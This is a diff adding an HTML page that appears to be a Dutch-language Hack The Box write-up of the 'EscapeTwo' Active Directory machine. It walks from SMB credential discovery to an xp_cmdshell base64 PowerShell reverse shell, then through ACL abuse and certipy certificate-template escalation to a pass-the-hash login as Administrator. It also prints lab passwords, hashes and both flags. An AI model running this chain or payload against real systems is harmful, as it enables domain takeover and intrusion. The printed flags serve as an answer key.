@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Als eerst zal ik gaan kijken welke poorten dat er allemaal openstaan. Dit zal je kunnen zien aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.88.97 -vvvv Als we gaan kijken naar de nmap zullen we zien dat er 23 Poorten er open staan. Wat zijn de services die dat er openstaan?
+Port 139: NetBIOS Session Service (NetBIOS over TCP/IP)
+Port 53: Domain Name System (DNS)
+Port 445: Server Message Block (SMB) over TCP/IP (voor bestand- en printerdeling)
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-escapetwo/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Als eerst zal ik gaan kijken welke poorten dat er allemaal openstaan. Dit zal je kunnen zien aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.88.97 -vvvv Als we gaan kijken naar de nmap zullen we zien dat er 23 Poorten er open staan. Wat zijn de services die dat er openstaan?
+Port 139: NetBIOS Session Service (NetBIOS over TCP/IP)
+Port 53: Domain Name System (DNS)
+Port 445: Server Message Block (SMB) over TCP/IP (voor bestand- en printerdeling)">
+  <meta itemprop="wordCount" content="1741">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Als eerst zal ik gaan kijken welke poorten dat er allemaal openstaan. Dit zal je kunnen zien aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.88.97 -vvvv Als we gaan kijken naar de nmap zullen we zien dat er 23 Poorten er open staan. Wat zijn de services die dat er openstaan?
+Port 139: NetBIOS Session Service (NetBIOS over TCP/IP)
+Port 53: Domain Name System (DNS)
+Port 445: Server Message Block (SMB) over TCP/IP (voor bestand- en printerdeling)">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-escapetwo/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>Als eerst zal ik gaan kijken welke poorten dat er allemaal openstaan. Dit zal je kunnen zien aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>nmap -p- -sCV 10.129.88.97 -vvvv
+</code></pre><p>Als we gaan kijken naar de nmap zullen we zien dat er 23 Poorten er open staan. Wat zijn de services die dat er openstaan?</p>
+<ul>
+<li>
+<p><strong>Port 139</strong>: NetBIOS Session Service (NetBIOS over TCP/IP)</p>
+</li>
+<li>
+<p><strong>Port 53</strong>: Domain Name System (DNS)</p>
+</li>
+<li>
+<p><strong>Port 445</strong>: Server Message Block (SMB) over TCP/IP (voor bestand- en printerdeling)</p>
+</li>
+<li>
+<p><strong>Port 135</strong>: Microsoft Remote Procedure Call (MSRPC)</p>
+</li>
+<li>
+<p><strong>Port 9389</strong>: Active Directory Web Services (ADWS)</p>
+</li>
+<li>
+<p><strong>Port 49666</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 3269</strong>: Global Catalog Service (LDAP over SSL voor Global Catalog)</p>
+</li>
+<li>
+<p><strong>Port 47001</strong>: Windows Remote Management Service (WinRM)</p>
+</li>
+<li>
+<p><strong>Port 464</strong>: Kerberos Change/Set Password Service</p>
+</li>
+<li>
+<p><strong>Port 49712</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 49667</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 49680</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 3268</strong>: Global Catalog Service (LDAP voor Global Catalog)</p>
+</li>
+<li>
+<p><strong>Port 5985</strong>: Windows Remote Management (HTTP)</p>
+</li>
+<li>
+<p><strong>Port 49685</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 88</strong>: Kerberos Authentication Service (Kerberos-sec)</p>
+</li>
+<li>
+<p><strong>Port 593</strong>: Distributed Component Object Model (DCOM) of RPC-over-HTTP</p>
+</li>
+<li>
+<p><strong>Port 636</strong>: LDAP over SSL (LDAPS)</p>
+</li>
+<li>
+<p><strong>Port 49730</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 49692</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+<li>
+<p><strong>Port 1433</strong>: Microsoft SQL Server (standaard TCP-poort voor SQL Server)</p>
+</li>
+<li>
+<p><strong>Port 49664</strong>: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)</p>
+</li>
+</ul>
+<p>Aan de hand van de volgende poort kan ik gaan zien of dat het een AD is of dat het een normale server of een domain controller is. We kunnen dus aan de hand van de foto hieronder zien dat het een AD Domain controller is.</p>
+<p><img src="80543764.png" alt="image-20250111-193536.png"></p>
+<p>Nu ben ik het enum4linux commando gaan gebruiken voor het enumeraten van AD. Enum4linux gaat van alle basic checks gaan doen op windows services zoals een rpc, smb, ldap, … . Dit zullen we dus gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>enum4linux sequel.htb -u &#39;rose&#39; -p &#39;KxEPkKe6R8su&#39;
+</code></pre><p><img src="80511001.png" alt="image-20250111-194416.png"></p>
+<p>Hierbij krijgen we veel belangrijke informatie te zien. zoals een welke users er zijn, wat de shares zijn, welke groups er allemaal zijn.</p>
+<p>Als we zullen gaan kijken op welke shared disks de user rose mag gaan zullen we gaan zien dat deze user tot 5 shared disks read only rechten heeft. De shared disks waar tot ze toegang heeft zijn de volgende disks.</p>
+<ul>
+<li>
+<p>Accounting department</p>
+</li>
+<li>
+<p>IPC$</p>
+</li>
+<li>
+<p>NETLOGON</p>
+</li>
+<li>
+<p>SYSVOL</p>
+</li>
+<li>
+<p>Users</p>
+</li>
+</ul>
+<p><img src="80576536.png" alt="image-20250111-195013.png"></p>
+<p>Ik zal nu 1 voor 1 gaan connecteren met elke disk voor te zien of dat er geen belangrijke informatie inzit. Dit zal ik gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>smbclient \\\\10.129.88.97\\&lt;disk&gt; -U &#39;rose&#39;
+</code></pre><p>Als eerst kon ik dus niet connecteren met de share Accounting Department. Daarna had ik pas door dat je dus niet kon connecteren omdat er een spatie in de shared name stond. Ik heb hierdoor dus dubbel aanhalingstekens gebruikt en nu kon ik dus wel connecteren op de shared drive.</p>
+<p><img src="80576563.png" alt="image-20250112-132806.png"></p>
+<p>Binnen deze shared drive hebben we 2 .xlsx files. ik zal deze nu gaan downloaden naar mijn eigen machine zodat ik de files kan gaan analyseren. Dit zal ik gaan down aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>get &lt;name van de file&gt;
+</code></pre><p><img src="80478264.png" alt="image-20250112-132934.png"></p>
+<p>Voor dat we deze files dus kunnen zullen we deze eerst moeten gaan unzippen. Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>unzip accounts.xlsx -d output_directory
+</code></pre><p><img src="80478272.png" alt="image-20250112-133855.png"></p>
+<p>De “-d output_directory” commando dient ervoor van de files die dat in het bestand accounts.xlsx stonden te gaan wegschrijven in de directory “output_directory“.</p>
+<p>bij het unzippen van deze files heb ik verschillende Usernames en Passwords gevonden.</p>
+<p><img src="80511028.png" alt="image-20250112-140023.png"></p>
+<pre tabindex="0"><code>|**First name**|**Last name**|**Email**|**Username**|**Password**||
+|---|---|---|---|---|---|
+|Angela|Martin|angela@sequel.htb|angela|0fwz7Q4mSpurIt99||
+|Oscar|Martinez|oscar@sequel.htb|oscar|86LxLBMgEWaKUnBG||
+|Kevin|Malone|kevin@sequel.htb|kevin|Md9Wlq1E5bZnVDVo||
+|||sa@sequel.htb|sa|MSSQLP@ssw0rd!||
+</code></pre><p>Nu dat ik de volgende gegevens weet kan ik een connectie gaan starten naar de sql server. Dit zal ik gaan doen aan de hand van de volgende gegevens:</p>
+<pre tabindex="0"><code>impacket-mssqlclient dc01.sequel.htb/&#39;sa&#39;:&#39;MSSQLP@ssw0rd!&#39;@10.129.253.188
+</code></pre><p><img src="80478305.png" alt="image-20250112-153711.png"></p>
+<p>Door binnen de sql server het volgende commando uittevoeren, kunnen we een revshell gaan opstarten. Hiervoor zullen we op onze eigen machine een listener moeten starten. Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>en zullen we dus nu op de sql server het volgende commando gaan uitvoeren.</p>
+<pre tabindex="0"><code>xp_cmdshell &#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#34;
+</code></pre><p><img src="80478335.png" alt="image-20250112-175712.png"></p>
+<p>Nu zal je dus kunnen zien dat we een reverseshell hebben gekregen met de sql server.</p>
+<p><img src="80478341.png" alt="image-20250112-175840.png"></p>
+<p>Als we gaan kijken in de directory SQL2019,zullen we daar de sub directory ExpressAdv_ENU zien staan. In deze sub directory hebben we verschillende files. Ik ben al eerst gaan kijken in de sql-configuration file. Daarin heb ik de login gegevens gevonden van de user sql_svc.</p>
+<ul>
+<li>
+<p>username: sql_svc</p>
+</li>
+<li>
+<p>password: WqSZAF6CysDQbGb3ls</p>
+</li>
+</ul>
+<p><img src="80576612.png" alt="image-20250112-194116.png"></p>
+<p>Als we nu een connectie gaan proberen starten met evil-winrm aan de hand van de gegevens die we hier boven zien. zullen we zien dat we geen connectie kunnen maken.</p>
+<p><img src="80543832.png" alt="image-20250112-201033.png"></p>
+<p>Maar als we nu de user ryan zullen gaan gebruiken en het password van de sql_svc user, zullen we zien dat we connectie kunnen maken. Dit heb ik gevonden door alle users met alle passworden is te proberen. Ik heb de connectie kunnen maken aan de hand van de volgende gegevens:</p>
+<pre tabindex="0"><code>evil-winrm -u &#39;ryan&#39; -p &#39;WqSZAF6CysDQbGb3&#39; -i sequel.htb0
+</code></pre><ul>
+<li>
+<p>username: ryan</p>
+</li>
+<li>
+<p>password: WqSZAF6CysDQbGb3</p>
+</li>
+</ul>
+<p><img src="80478373.png" alt="image-20250112-201151.png"></p>
+<p>Als we nu naar de desktop gaan zal je kunnen zien dat we daar de eerst flag ”De User Flag” hebben gevonden.</p>
+<p>user flag: d33e2bf1789154728111b617bc3ae0e3</p>
+<p><img src="80478356.png" alt="image-20250112-193536.png"></p>
+<p>We zullen dus nu Bloodhound gaan installeren en gebruik gaan maken voor het path te zoeken naar de admin.</p>
+<p>Eens dat bloodhound is geinstalleerd zullen we de volgende code gaan uitvoeren.</p>
+<pre tabindex="0"><code>nxc ldap 10.129.67.214 -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.129.67.214 &lt;Ip dat we moeten gebruiken voor te hacken, dus niet ip van de eigen machine&gt;
+</code></pre><p>We kunnen ook op de windows machine sharphound gaan toevoegen door SharpHound.exe upteloaden op de windows machine en deze dan uittevoeren. Dan de file naar de eigen machine te downloaden en dan upteloaden op BloodHound.</p>
+<p>Als we dus dan naar bloodhound gaan daar zal je dan rechts data kunnen importeren. Deze dat is het zip bestand dat we zonet hebben gehaald door het commando van hierboven uittevoeren.</p>
+<p><img src="81330185.png" alt="image-20250113-093132.png"><img src="81297411.png" alt="image-20250113-093149.png"></p>
+<p>Dan kies je het zip bestand en dan kan je in de search balk de username gaan opzoeken, Druk dan op enter en je krijgt het volgende te zien.</p>
+<p><img src="81330191.png" alt="image-20250113-093251.png"></p>
+<p>Ik ben gaan opzoeken hoe dat we de user “ca_svc“ zijn password konden gaan veranderen. Dit heb ik kunnen doen aan de hand van de volgende stappen te volgen.</p>
+<p>Op de Kali linux machine voer je de beide volgende codes uit.</p>
+<pre tabindex="0"><code>impacket-owneredit -action write -new-owner &#39;ryan&#39; -target &#39;ca_svc&#39; &#39;sequel.htb&#39;/&#39;ryan&#39;:&#39;WqSZAF6CysDQbGb3&#39;
+
+impacket-owneredit -action write -new-owner &#39;ryan&#39; -target &#39;ca_svc&#39; &#39;sequel.htb&#39;/&#39;ryan&#39;:&#39;WqSZAF6CysDQbGb3&#39;
+</code></pre><p>Daarna zal je dus een connectie gaan maken met de windows machine aan de hand van de usercredentials van ryan te gebruiken.</p>
+<pre tabindex="0"><code>evil-winrm --user &#39;ryan&#39; --password &#39;WqSZAF6CysDQbGb3&#39; --ip 10.129.67.214
+</code></pre><p>Nu dat je de connectie hebt gemaakt zal je aan de hand van de volgende codes het password van de user ca_svc kunnen gaan veranderen. <a href="https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit">https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit</a></p>
+<pre tabindex="0"><code>Import-Module ./PowerView.ps1
+Set-DomainObjectOwner -identity ca_svc -OwnerIdentity ryan
+Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights ResetPassword
+$cred = ConvertTo-SecureString &#34;Password123!&#34; -AsPlainText -force
+Set-DomainUserPassword -identity ca_svc -accountpassword $cred
+</code></pre><p><img src="81592326.png" alt="image-20250113-124915.png"></p>
+<p>En zoals je dan hierboven kunt zien hebben we het password van de user kunnen veranderen.</p>
+<p>Voor administrator te kunnen worden zullen we het certificate van de user ca_svc gaan halen. door dit te doen zullen we met het cert dat de administrator gebruikt kunnen binnen geraken als admin. Voor dit te kunnen doen zullen we de volgende code moeten gebruiken.</p>
+<pre tabindex="0"><code>impacket-owneredit -action write -new-owner &#39;ryan&#39; -target &#39;ca_svc&#39; &#39;sequel.htb&#39;/&#39;ryan&#39;:&#39;WqSZAF6CysDQbGb3&#39;
+impacket-dacledit -action &#39;write&#39;  -rights &#39;FullControl&#39; -inheritance -principal ryan  -target &#39;ca_svc&#39; sequel.htb/ryan:WqSZAF6CysDQbGb3  -dc-ip 10.129.67.214
+certipy shadow auto -u ryan@sequel.htb -p &#39;WqSZAF6CysDQbGb3&#39; -account ca_svc -target dc01.sequel.htb -dc-ip 10.129.67.214 &lt;Hiermee zullen we de hash gaan krijgen voor te gebruiken bij het pakken van het certificate.&gt;
+KRB5CCNAME=ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.67.214 &lt;Hiermee gaan we de template van het cert da we nodig hebben gaan updaten.&gt;
+certipy req -u ca_svc -hashes  3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.67.214 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -debug
+certipy auth -pfx ./administrator.pfx -dc-ip 10.129.67.214
+</code></pre><p>Wat gaan de volgende commands doen?</p>
+<p><strong>Impacket-owner</strong></p>
+<p>Het impacket-owneredit-tool wordt gebruikt om de eigenaar van een object in Active Directory te wijzigen. Hier wordt het eigenaarschap van het object ca_svc gewijzigd naar de gebruiker ryan.</p>
+<pre tabindex="0"><code>impacket-owneredit -action write -new-owner &#39;ryan&#39; -target &#39;ca_svc&#39; &#39;sequel.htb&#39;/&#39;ryan&#39;:&#39;WqSZAF6CysDQbGb3&#39;
+</code></pre><p><strong>impacket-dacledit</strong></p>
+<p>Het impacket-dacledit-tool wordt gebruikt om de toegangsrechten (permissions) op een object in Active Directory te wijzigen. Hier worden FullControl-rechten toegekend aan de gebruiker ryan voor het object ca_svc.</p>
+<pre tabindex="0"><code>impacket-dacledit -action &#39;write&#39;  -rights &#39;FullControl&#39; -inheritance -principal ryan  -target &#39;ca_svc&#39; sequel.htb/ryan:WqSZAF6CysDQbGb3  -dc-ip 10.129.67.214
+</code></pre><p><strong>Certipy shadow command</strong></p>
+<p>Het certipy shadow-commando misbruikt de CA-rollen (Certificate Authority) om toegang te krijgen tot de account-gegevens van ca_svc. Dit levert de NTLM-hash of TGT (Ticket Granting Ticket) van het account op.</p>
+<pre tabindex="0"><code>certipy shadow auto -u ryan@sequel.htb -p &#39;WqSZAF6CysDQbGb3&#39; -account ca_svc -target dc01.sequel.htb -dc-ip 10.129.67.214 &lt;Hiermee zullen we de hash gaan krijgen voor te gebruiken bij het pakken van het certificate.&gt;
+</code></pre><p><strong>Certipy template commando</strong></p>
+<p>Dit commando wordt gebruikt om een malafide certificatensjabloon (template) te manipuleren of te misbruiken. Dit kan worden gebruikt om een geldig certificaat te genereren.</p>
+<pre tabindex="0"><code>KRB5CCNAME=ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.67.214 &lt;Hiermee gaan we de template van het cert da we nodig hebben gaan updaten.&gt;
+</code></pre><p><strong>Certipy req commando</strong></p>
+<p>Dit commando vraagt een certificaat aan via de malafide certificatensjabloon. Het resultaat is een geldig certificaat dat gebruikt kan worden om te authenticeren als Administrator.</p>
+<pre tabindex="0"><code>certipy req -u ca_svc -hashes  3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.67.214 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -debug
+</code></pre><p><strong>Certipy auth commando</strong></p>
+<p>Dit commando gebruikt het verkregen certificaat (administrator.pfx) om te authenticeren als Administrator.</p>
+<pre tabindex="0"><code>certipy auth -pfx ./administrator.pfx -dc-ip 10.129.67.214
+</code></pre><p>bij het uivoeren van het laatste commando kan je zien dat we de hash van de administrator hebben gekregen. deze zullen we nu moeten gaan gebruiken voor int e kunnen loggen hebben we de root flag administrator.</p>
+<pre tabindex="0"><code>hash: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+</code></pre><p><img src="81428494.png" alt="image-20250113-132402.png"></p>
+<p>we zullen dit gaan doen aan de hand van de applicatie psexec.py. Aan de hand van deze applicatie zullen we kunnen inloggen als administrator op de machine. We zullen hiervoor het volgende commando gaan gebruiken.</p>
+<pre tabindex="0"><code>python3 psexec.py sequel.htb/administrator@10.129.67.214 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff 
+</code></pre><p><img src="80576661.png" alt="image-20250113-134707.png"></p>
+<p>zoals je nu kunt zien zijn we ingelogd als user administrator.</p>
+<p><img src="81428504.png" alt="image-20250113-134810.png"></p>
+<p>en als we nu dus gaan navigeren naar de administrator/desktop directory zullen we daar de root flag zien staan.</p>
+<p>root flag: 372c23d287d38551c48bb024bc0e2c23</p>
+<p><img src="81592338.png" alt="image-20250113-135008.png"></p>
+<p><img src="81461266.png" alt="image-20250113-135120.png"></p>
+<p>Deze machine heb ik gehacked op 12/1/2025 → 1 dag na dat hij uit was. Dus dit is nog een active box.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
